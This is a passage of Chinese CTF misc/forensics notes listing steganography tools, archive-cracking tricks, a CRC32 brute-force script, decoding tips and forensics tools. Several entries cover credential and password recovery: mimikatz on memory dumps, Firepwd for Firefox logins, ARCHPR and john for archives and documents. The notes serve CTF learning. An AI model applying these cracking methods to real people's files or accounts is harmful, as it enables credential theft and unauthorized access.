res.zip</li><li>binwalk<ul><li>binwalk xxx(支持任何类型，加上-e可以提取，不过有时候提取不出来，下方的foremost补充使用)</li><li>binwalk可能会提取出一些Zlib compressed data，有时候flag会藏在里面。</li></ul></li><li>foremost(有时候即使binwalk没有提示任何文件，foremost也能提取出东西。所以binwalk提示没有问题时，也不要忘记试foremost)</li><li>outguess，例题：<a href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/4%E7%BA%A7/Misc/Avatar.md">Avatar</a>。注意有时候outguess会需要密码，密码可能藏在exif里。例题:<a href="https://blog.csdn.net/mochu7777777/article/details/108936734">[ACTF新生赛2020]outguess</a></li><li><a href="https://github.com/matthewgao/F5-steganography">F5隐写</a>，例题：<a href="https://blog.csdn.net/destiny1507/article/details/102079695">刷新过的图片</a>。另一个更详细的F5隐写变种题:<a href="https://github.com/Aryvd/Aryvd/tree/main/Refresh!">Refresh!</a></li><li>stegsolve</li><li>NtfsStreamsEditor,用于处理NTFS流隐藏文件。例题：<a href="https://blog.csdn.net/mochu7777777/article/details/108934265">[SWPU2019]我有一只马里奥</a>。当题目涉及到NTFS流时，题目文件都需要用Win RAR解压。</li><li><a href="https://achorein.github.io/silenteye/">SilentEye</a>（音频隐写工具）</li><li>steghide（多类型文件隐写工具）</li></ul><blockquote><p>steghide有时需要密码，可以用<a href="https://github.com/RickdeJager/stegseek">stegseek</a>破解。</p></blockquote><ul><li><a href="https://github.com/AngelKitty/stegosaurus">Stegosaurus</a>(pyc文件隐写工具)</li><li><a href="http://jpinsoft.net/deepsound/overview.aspx">DeepSound</a>（音频隐写工具）</li><li><a href="https://github.com/ragibson/Steganography">stegolsb</a>.</li></ul><blockquote><p>LSB隐写工具，音频图片都可以。</p></blockquote><ul><li><p><a href="https://holloway.nz/steg/">Twitter Secret Messages</a>。这个工具的密文很好辨认，例如<code>I hａtｅ tｈis flｙiｎｇ ｂⅰrｄ aｐp... Peοpｌe saｙ ｏnｅ thіngｂutyoｕ ａｌｗayｓ gοtta reａd bｅtｗeen thｅliｎeｓ ｔο interpret them right ://</code>。推特&#x2F;蓝鸟是出题人的提示关键词。</p></li><li><p><a href="https://www.petitcolas.net/steganography/mp3stego/">mp3stego</a>.mp3带密码的隐写工具。</p></li><li><p><a href="https://github.com/AdamNiederer/base100">base100</a>。将文字与emoji互相转换的编码工具。</p></li><li><p><a href="https://github.com/JavDomGom/videostego">videostego</a></p><blockquote><p>视频文件的LSB隐写工具。若没有后续改动的话，被隐写后的视频的exif的Writer栏为JavDomGom</p></blockquote></li><li><p><a href="https://www.openstego.com/">OpenStego</a></p><ul><li>bmp&#x2F;png文件隐写工具，需要密码</li></ul></li><li><p><a href="https://github.com/Byxs20/PuzzleSolver">PuzzleSolver</a></p><ul><li>能干的事情很多，不止隐写。不过我认识到这个工具是因为里面有个python3频率盲水印，用其他的脚本提取不出来</li></ul></li><li><p><a href="https://dothidden.xyz/la_ctf_2024/discord_events/">discord events</a></p><ul><li><a href="https://stegcloak.surge.sh/">Steg Cloak</a>的解码。被Steg Cloak加密的文字会包含不可见字符</li></ul></li><li><p><a href="https://github.com/RJCyber1/VishwaCTF-2024-Writeups/blob/main/Steg/Professor's%20Inheritance.md">Professor’s Inheritance</a></p><ul><li><a href="https://github.com/osde8info/stegosuite">Stegosuite</a></li></ul></li><li><p><a href="https://berliangabriel.github.io/post/shakti-ctf-2024-foren">Aqua Gaze</a></p><ul><li><a href="https://github.com/lukechampine/jsteg">jsteg</a></li></ul></li><li><p><a href="https://github.com/LazyTitan33/CTF-Writeups/blob/main/Unbreakable-Individual-2024/secrets-of-winter.md">secrets-of-winter</a></p><ul><li><a href="https://github.com/bannsec/stegoVeritas">StegoVeritas</a></li></ul></li><li><p><a href="https://warlocksmurf.github.io/posts/sdctf2024/#watch-the-waves-forensics">Watch the Waves</a></p><ul><li><a href="https://directmusic.me/wav2png/">wav2png</a></li><li>如果png转出来的wav听不清，可尝试在stegsolve里换一下bit planes</li><li>这题的第二部分有sstv命令使用例子</li><li>官方的脚本： <a href="https://github.com/acmucsd/sdctf-2024/tree/main/forensics">https://github.com/acmucsd/sdctf-2024/tree/main/forensics</a></li></ul></li></ul><ol><li>当遇见单独加密的压缩包时，首先确认是不是<a href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/1%E7%BA%A7/Misc/fakezip.md">伪加密</a>。不同版本的zip加密位不一样,例如有些zip需要将第7个字节的09改成00。如果不是，考虑到没有其它提示的因素，可以尝试直接ARCHPR爆破，常见的爆破掩码为4位数字。</li><li>010Editor自带很多文件类型模板，把常用的例如png装上，鼠标悬浮在数据上就能得到那些数据代表的内容。修改单个字节可以鼠标选中要修改的字节，然后菜单栏-&gt;编辑-&gt;插入&#x2F;覆盖-&gt;插入字节</li><li>numpy.loadtxt读取坐标文件+基本matplotlib图像绘制。例题:<a href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Misc/%E6%A2%85%E8%8A%B1%E9%A6%99%E4%B9%8B%E8%8B%A6%E5%AF%92%E6%9D%A5.md">梅花香之苦寒来</a></li><li>audacity打开文件发现有两个声道且其中一个声道没用时，可以在最左侧调节左右声道的音量，然后菜单栏-&gt;文件-&gt;导出。</li><li>morse2ascii工具可以解码音频摩斯电码。例题：<a href="https://www.cnblogs.com/tac2664/p/13861595.html">穿越时空的思念</a></li><li><a href="https://www.dcode.fr/braille-alphabet">盲文解密</a>（Braille Alphabet），形如<code>⡇⡓⡄⡖⠂⠀⠂⠀⡋⡉⠔⠀⠔⡅⡯⡖⠔⠁⠔⡞⠔⡔⠔⡯⡽⠔⡕⠔⡕⠔⡕⠔⡕⠔⡕⡍=</code>。</li><li>当题目文件出现大量无特征、无规律字符时，考虑是不是字频统计。例题:<a href="https://buuoj.cn/challenges#[GXYCTF2019]gakki">[GXYCTF2019]gakki</a></li><li>010Editor可以更改阅读文本文件时的编码。菜单栏-&gt;视图-&gt;字符集。</li><li>福尔摩斯跳舞的小人密码。例题:<a href="https://blog.csdn.net/mochu7777777/article/details/109387134">[SWPU2019]伟大的侦探</a></li><li>音符密码，形如<code>♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§=</code>。可在<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">此处</a>直接解密。</li><li>AAEncode，特征是颜文字，是将js代码转换为颜文字的编码。可用<a href="http://www.atoolbox.net/Tool.php?Id=703">网站</a>在线解码。例题:<a href="https://blog.csdn.net/mochu7777777/article/details/109481013">[SUCTF2018]single dog</a>。</li><li>敲击码。类似棋盘密码，只不过与平时的棋盘排版不同，C和K在一个格，形如下方展示，&#x2F;表示分割。</li></ol><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.....</span> <span class="hljs-string">../...</span> <span class="hljs-string">./...</span> <span class="hljs-string">./...</span> <span class="hljs-string">../</span><br>  5,2     3,1    3,1    3,2<br></code></pre></td></tr></table></figure><p>例题:<a href="https://blog.csdn.net/mochu7777777/article/details/109449494">[SWPU2019]你有没有好好看网课?</a></p><ol start="22"><li>不要忘记查看压缩包注释。不装软件的情况下似乎看不到，可以安装Bandzip工具。</li><li>遇见docx文件时，粗略看一遍看不出来线索就改后缀名为rar后解压查看里面是否有东西，或者直接binwalk -e提取内容。</li><li><a href="https://github.com/livz/cloacked-pixel">lsb隐写工具</a>（不是stegsolve可以提取的那种lsb隐写，可以加密码的另外一种）</li><li>视频题粗略看一遍后最好放慢来看有没有漏掉的信息，可用<a href="https://www.kinovea.org/">Kinovea</a>。例题:<a href="https://blog.csdn.net/mochu7777777/article/details/109461931">[RoarCTF2019]黄金6年</a></li><li>磁盘、映像题，比如iso文件，打开后注意勾选上“隐藏的项目”，这种藏文件的方法不能漏掉了。</li><li>pdf文件可以用photoshop等软件打开，能找到里面隐藏的图片等内容。</li><li>crc值爆破恢复文件内容。zip加密的文件内容不应过小，因为此时攻击者可以通过爆破crc值的形式恢复文件内容。例题:<a href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/4%E7%BA%A7/Misc/crc.md">crc</a>。下方脚本可以通过crc值破解多个zip，并将zip的内容写入一个文件中。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CrackCrc</span>(<span class="hljs-params">crc</span>):<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> dic:<br><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> dic:<br>s = i + j + k + h<br><span class="hljs-keyword">if</span> crc == (binascii.crc32(s.encode())):<br>f.write(s)<br><span class="hljs-keyword">return</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CrackZip</span>():<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">68</span>):<br>file = <span class="hljs-string">&#x27;out&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;.zip&#x27;</span><br>crc = zipfile.ZipFile(file,<span class="hljs-string">&#x27;r&#x27;</span>).getinfo(<span class="hljs-string">&#x27;data.txt&#x27;</span>).CRC<br>CrackCrc(crc)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\r&#x27;</span>+<span class="hljs-string">&quot;loading：&#123;:%&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">float</span>((i+<span class="hljs-number">1</span>)/<span class="hljs-number">68</span>)),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>dic = string.ascii_letters + string.digits + <span class="hljs-string">&#x27;+/=&#x27;</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nCRC32begin&quot;</span>)<br>CrackZip()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nCRC32finished&quot;</span>)<br>f.close()<br></code></pre></td></tr></table></figure><ol start="29"><li>中文电码+五笔编码。例题:<a href="../../CTF/BUUCTF/Crypto/%E4%BF%A1%E6%81%AF%E5%8C%96%E6%97%B6%E4%BB%A3%E7%9A%84%E6%AD%A5%E4%BC%90.md">信息化时代的步伐</a></li><li>DTMF拨号音识别+手机键盘密码。DTMF拨号音就像平时座机拨号的声音，手机键盘密码就是9键。例题:<a href="https://blog.csdn.net/mochu7777777/article/details/105412940">[WUSTCTF2020]girlfriend</a>，使用工具<a href="http://hl.altervista.org/split.php?http://aluigi.altervista.org/mytoolz/dtmf2num.zip">dtmf2num</a></li><li>mimikatz可分析dmp后缀文件并获取密码。例题：<a href="../../CTF/BUUCTF/Misc/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5DAttack.md">[安洵杯 2019]Attack</a></li><li>当一串base64解码后是<code>Salted__</code>，可能的密文格式为AES，3DES或者Rabbit。</li><li>usb流量包数据提取。例题:<a href="../../CTF/moectf/2022/Misc/usb.md">usb</a></li><li>rar文件可以通过更改文件结构隐藏文件，效果是让rar里有的文件解压不出来。用010 Editor打开rar文件，注意用文件名的区域开头是否是74（在<a href="https://www.freebuf.com/column/199854.html">RAR文件结构</a>中，文件块的位置应该是74并不是7A，74让文件可以被解压出来，7A则不能），如果不是要改成74让文件被解压出来。例题:<a href="https://blog.csdn.net/mochu7777777/article/details/109632626">USB</a></li><li>python3 单字节16进制异或结果写入文件。今天遇到一道题，文本文件里的内容需要需要单字节与5异或后转为16进制写入文件。不知道为啥大佬们的脚本我用不了，可能是版本的问题，故自己写了一个python3的简陋玩意。题目:<a href="https://blog.csdn.net/mochu7777777/article/details/105367979">[GUET-CTF2019]虚假的压缩包</a></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>original = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;亦真亦假&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read()<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ctf&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>res=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> original:<br>tmp = <span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^<span class="hljs-number">5</span><br>res+=<span class="hljs-built_in">hex</span>(tmp)[<span class="hljs-number">2</span>:]<br>flag.write(long_to_bytes(<span class="hljs-built_in">int</span>(res,<span class="hljs-number">16</span>)))<br></code></pre></td></tr></table></figure><ol start="36"><li>ttl隐写脚本。例题:<a href="https://blog.csdn.net/mochu7777777/article/details/109633675">[SWPU2019]Network</a></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;attachment.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>    a=fp.readlines()<br>    p=[]<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>       p.append(<span class="hljs-built_in">int</span>(a[x])) <br>    s=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> p:<br>        <span class="hljs-keyword">if</span>(i==<span class="hljs-number">63</span>):<br>            b=<span class="hljs-string">&#x27;00&#x27;</span><br>        <span class="hljs-keyword">elif</span>(i==<span class="hljs-number">127</span>):<br>            b=<span class="hljs-string">&#x27;01&#x27;</span><br>        <span class="hljs-keyword">elif</span>(i==<span class="hljs-number">191</span>):<br>            b=<span class="hljs-string">&#x27;10&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            b=<span class="hljs-string">&#x27;11&#x27;</span><br>        s +=b<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s),<span class="hljs-number">8</span>):<br>    flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(s[i:i+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>))<br>flag = binascii.unhexlify(flag)<br>wp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ans&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>wp.write(flag)<br>wp.close()<br></code></pre></td></tr></table></figure><ol start="37"><li>logo编程语言，可用于绘画，形如：</li></ol><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">cs pu lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 500 </span>rt<span class="hljs-number"> 90 </span>pd fd<span class="hljs-number"> 100 </span>rt<span class="hljs-number"> 90 </span>repeat 18[fd<span class="hljs-number"> 5 </span>rt 10] lt<span class="hljs-number"> 135 </span>fd<span class="hljs-number"> 50 </span>lt<span class="hljs-number"> 135 </span>pu bk<span class="hljs-number"> 100 </span>pd setcolor pick [ red orange yellow green blue violet ] repeat 18[fd<span class="hljs-number"> 5 </span>rt 10] rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 60 </span>rt<span class="hljs-number"> 90 </span>bk<span class="hljs-number"> 30 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 60 </span>pu lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 100 </span>pd rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 50 </span>bk<span class="hljs-number"> 50 </span>setcolor pick [ red orange yellow green blue violet ] lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 50 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 50 </span>pu fd<span class="hljs-number"> 50 </span>pd fd<span class="hljs-number"> 25 </span>bk<span class="hljs-number"> 50 </span>fd<span class="hljs-number"> 25 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 50 </span>pu setcolor pick [ red orange yellow green blue violet ] fd<span class="hljs-number"> 100 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 30 </span>rt<span class="hljs-number"> 45 </span>pd fd<span class="hljs-number"> 50 </span>bk<span class="hljs-number"> 50 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 50 </span>bk<span class="hljs-number"> 100 </span>fd<span class="hljs-number"> 50 </span>rt<span class="hljs-number"> 45 </span>pu fd<span class="hljs-number"> 50 </span>lt<span class="hljs-number"> 90 </span>pd fd<span class="hljs-number"> 50 </span>bk<span class="hljs-number"> 50 </span>rt<span class="hljs-number"> 90 </span>setcolor pick [ red orange yellow green blue violet ] fd<span class="hljs-number"> 50 </span>pu lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 100 </span>pd fd<span class="hljs-number"> 50 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 25 </span>bk<span class="hljs-number"> 25 </span>lt<span class="hljs-number"> 90 </span>bk<span class="hljs-number"> 25 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 25 </span>setcolor pick [ red orange yellow green blue violet ] pu fd<span class="hljs-number"> 25 </span>lt<span class="hljs-number"> 90 </span>bk<span class="hljs-number"> 30 </span>pd rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 25 </span>pu fd<span class="hljs-number"> 25 </span>lt<span class="hljs-number"> 90 </span>pd fd<span class="hljs-number"> 50 </span>bk<span class="hljs-number"> 25 </span>rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 25 </span>lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 25 </span>bk<span class="hljs-number"> 50 </span>pu bk<span class="hljs-number"> 100 </span>lt<span class="hljs-number"> 90 </span>setcolor pick [ red orange yellow green blue violet ] fd<span class="hljs-number"> 100 </span>pd rt<span class="hljs-number"> 90 </span>arc<span class="hljs-number"> 360 </span>20 pu rt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 50 </span>pd arc<span class="hljs-number"> 360 </span>15 pu fd<span class="hljs-number"> 15 </span>setcolor pick [ red orange yellow green blue violet ] lt<span class="hljs-number"> 90 </span>pd bk<span class="hljs-number"> 50 </span>lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 25 </span>pu home bk<span class="hljs-number"> 100 </span>lt<span class="hljs-number"> 90 </span>fd<span class="hljs-number"> 100 </span>pd arc<span class="hljs-number"> 360 </span>20 pu home<br></code></pre></td></tr></table></figure><p><a href="https://www.calormen.com/jslogo/">在线解释器</a></p><ol start="38"><li><a href="https://www.cnblogs.com/LEOGG321/p/14493327.html">zip明文攻击</a>，<a href="https://www.aloxaf.com/2019/04/zip_plaintext_attack/">原理</a>。明文攻击可以用<a href="https://blog.csdn.net/weixin_43778378/article/details/106077774">archpr</a>跑。archpr里面选好加密的zip文件后攻击类型选明文，然后点到明文，明文文件路径选择包含明文内容的zip（没错是zip，不是写有明文的txt，是装有明文的txt的zip）。例题:<a href="https://blog.csdn.net/qq_46230755/article/details/112108707">[ACTF新生赛2020]明文攻击</a></li><li><a href="https://zhuanlan.zhihu.com/p/87919817">零宽字符隐写</a>。<a href="http://330k.github.io/misc_tools/unicode_steganography.html">解密网站</a></li><li>010Editor找到工具-&gt;十六进制运算-&gt;二进制异或，可以直接对整个文件异或。</li><li>gaps+montage工具自动拼图。例题:<a href="https://blog.csdn.net/mochu7777777/article/details/109649446">[MRCTF2020]不眠之夜</a></li><li>汉信码，形如：</li></ol><p><img src="C:/Users/a1348/Desktop/NoobCTF-main/笔记/images/hanxin_code.png" alt="hanxin_code"></p><p>可用<a href="https://tuzim.net/hxdecode/">网站</a>解码。</p><ol start="43"><li><a href="https://lazzzaro.github.io/2020/06/20/misc-%E6%96%87%E4%BB%B6%E9%9A%90%E5%86%99/">snow隐写</a>，有<a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html">网页版</a>和<a href="https://darkside.com.au/snow/">exe版</a>。例题:<a href="https://blog.csdn.net/qq_53105813/article/details/127896201">看雪看雪看雪</a>。如果不知道密码，还可以尝试爆破，使用工具:<a href="https://github.com/0xHasanM/SnowCracker">SnowCracker</a>。例题:<a href="https://github.com/daffainfo/ctf-writeup/tree/main/GREP%20CTF%202023/Arctic%20Penguin">Arctic Penguin</a></li><li>图片隐写工具<a href="https://github.com/dhsdshdhk/stegpy">stegpy</a>。</li><li>ppt文档密码爆破工具。可用<a href="https://www.52pojie.cn/thread-82569-1-1.html">Accent OFFICE Password Recovery</a>工具，也能用<a href="https://fossies.org/linux/john/run/office2john.py">ffice2john.py</a>或者john。</li><li>电动车钥匙信号PT224X解码。例题:<a href="../../CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/3%E7%BA%A7/Misc/%E6%89%93%E5%BC%80%E7%94%B5%E5%8A%A8%E8%BD%A6.md">打开电动车</a>。类似的还有PT226x。例题:<a href="https://www.onctf.com/posts/d228f8e5.html#%E4%B8%80%E7%99%BE%E5%9B%9B%E5%8D%81%E5%85%AD%E3%80%81-HDCTF2019-%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90">[HDCTF2019]信号分析</a></li><li>TSL协议需要私钥（RSA）解密才能追踪。例题:<a href="https://blog.csdn.net/qq_45699846/article/details/123529342">[DDCTF2018]流量分析</a></li><li>VoIP——基于IP的语音传输（英语：Voice over Internet Protocol，缩写为VoIP）是一种语音通话技术，经由网际协议（IP）来达成语音通话与多媒体会议，也就是经由互联网来进行通信。其他非正式的名称有IP电话（IP telephony）、互联网电话（Internet telephony）、宽带电话（broadband telephony）以及宽带电话服务（broadband phone service）。在wireshark中可以根据数据包还原语音。菜单栏-&gt;Telephony-&gt;VoIP Calls。</li><li>SSTV音频解码。例题:<a href="https://blog.csdn.net/mochu7777777/article/details/109882441">[UTCTF2020]sstv</a></li><li>图片缺少IDAT标识时,在010 Editor中将缺少标识的chunk的union CTYPE type的位置补上IDAT十六进制标识49 44 41 54即可。例题:<a href="https://blog.csdn.net/mochu7777777/article/details/107737687">[湖南省赛2019]Findme</a></li><li>BPG图片可用<a href="https://en.bandisoft.com/honeyview/">honeyview</a>打开。</li><li>内存取证工具<a href="https://github.com/volatilityfoundation/volatility">Volatility</a>。例题:<a href="https://blog.csdn.net/mochu7777777/article/details/109853022">[HDCTF2019]你能发现什么蛛丝马迹吗</a></li><li>某些思路邪门的题里，图片的颜色十六进制号可能是flag的十六进制编码。</li><li><a href="https://baike.baidu.com/item/G%E4%BB%A3%E7%A0%81/2892251">GCode</a>,形如：</li></ol><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-name">M73</span> P<span class="hljs-number">0</span> R<span class="hljs-number">2</span><br><span class="hljs-name">M201</span> X<span class="hljs-number">9000</span> Y<span class="hljs-number">9000</span> Z<span class="hljs-number">500</span> E<span class="hljs-number">10000</span><br><span class="hljs-name">M203</span> X<span class="hljs-number">500</span> Y<span class="hljs-number">500</span> Z<span class="hljs-number">12</span> E<span class="hljs-number">120</span><br><span class="hljs-name">M204</span> P<span class="hljs-number">2000</span> R<span class="hljs-number">1500</span> T<span class="hljs-number">2000</span><br><span class="hljs-name">M205</span> X<span class="hljs-number">10.00</span> Y<span class="hljs-number">10.00</span> Z<span class="hljs-number">0.20</span> E<span class="hljs-number">2.50</span><br><span class="hljs-name">M205</span> S<span class="hljs-number">0</span> T<span class="hljs-number">0</span><br><span class="hljs-name">M107</span><br><span class="hljs-name">M115</span> U<span class="hljs-number">3.1</span><span class="hljs-number">.0</span><br><span class="hljs-name">M83</span><br><span class="hljs-name">M204</span> S<span class="hljs-number">2000</span> T<span class="hljs-number">1500</span><br><span class="hljs-name">M104</span> S<span class="hljs-number">215</span><br><span class="hljs-name">M140</span> S<span class="hljs-number">60</span><br><span class="hljs-name">M190</span> S<span class="hljs-number">60</span><br><span class="hljs-name">M109</span> S<span class="hljs-number">215</span><br><span class="hljs-name">G28</span> W<br><span class="hljs-name">G80</span><br><span class="hljs-name">G1</span> Y<span class="hljs-number">-3.0</span> F<span class="hljs-number">1000.0</span><br><span class="hljs-name">G92</span> E<span class="hljs-number">0.0</span><br><span class="hljs-name">G1</span> X<span class="hljs-number">60.0</span> E<span class="hljs-number">9.0</span>  F<span class="hljs-number">1000.0</span><br><span class="hljs-name">M73</span> P<span class="hljs-number">4</span> R<span class="hljs-number">1</span><br><span class="hljs-name">G1</span> X<span class="hljs-number">100.0</span> E<span class="hljs-number">12.5</span>  F<span class="hljs-number">1000.0</span><br><span class="hljs-name">G92</span> E<span class="hljs-number">0.0</span><br><span class="hljs-name">M900</span> K<span class="hljs-number">30</span><br><span class="hljs-name">G21</span><br><span class="hljs-name">G90</span><br><span class="hljs-name">M83</span><br><span class="hljs-name">G92</span> E<span class="hljs-number">0.0</span><br><span class="hljs-name">G1</span> E<span class="hljs-number">-0.80000</span> F<span class="hljs-number">2100.00000</span><br><span class="hljs-name">G1</span> Z<span class="hljs-number">0.600</span> F<span class="hljs-number">10800.000</span><br><span class="hljs-name">G1</span> X<span class="hljs-number">89.987</span> Y<span class="hljs-number">95.416</span><br><span class="hljs-name">G1</span> Z<span class="hljs-number">0.200</span><br><span class="hljs-name">G1</span> E<span class="hljs-number">0.80000</span> F<span class="hljs-number">2100.00000</span><br></code></pre></td></tr></table></figure><ol start="55"><li>FAT文件可以使用<a href="https://sourceforge.net/projects/veracrypt/">VeraCrypt</a>进行挂载</li><li>FAT文件在挂载输入密码的时候，不同的密码可以进入不同的文件系统</li><li>遇见vmdk文件，可以试试使用7z这个压缩软件打开，里面可能藏着其他文件。</li><li>邮件协议：POP、SMTP、IMAP</li><li>火狐浏览器的登陆凭证文件可用<a href="https://github.com/lclevy/firepwd">Firepwd</a>破解。</li><li>ext4文件系统可用<a href="https://extundelete.sourceforge.net/">extundelete</a>恢复被删除的目录或文件。例题:<a href="https://blog.csdn.net/mochu7777777/article/details/110004817">[XMAN2018排位赛]file</a></li><li>文件类型识别工具TrID（可识别Python Pickle序列号数据）。例题:<a href="https://blog.csdn.net/wangjin7356/article/details/122471475">我爱Linux</a></li><li><a href="https://www.cgsecurity.org/wiki/TestDisk_CN">TestDisk</a>磁盘恢复工具。例题:<a href="https://blog.csdn.net/mochu7777777/article/details/110079540">[BSidesSF2019]diskimage</a></li><li>usb数据提取+autokey爆破。例题:<a href="https://ctf-wiki.org/en/misc/traffic/protocols/usb/#_2">[XMAN2018排位赛]AutoKey</a></li><li><a 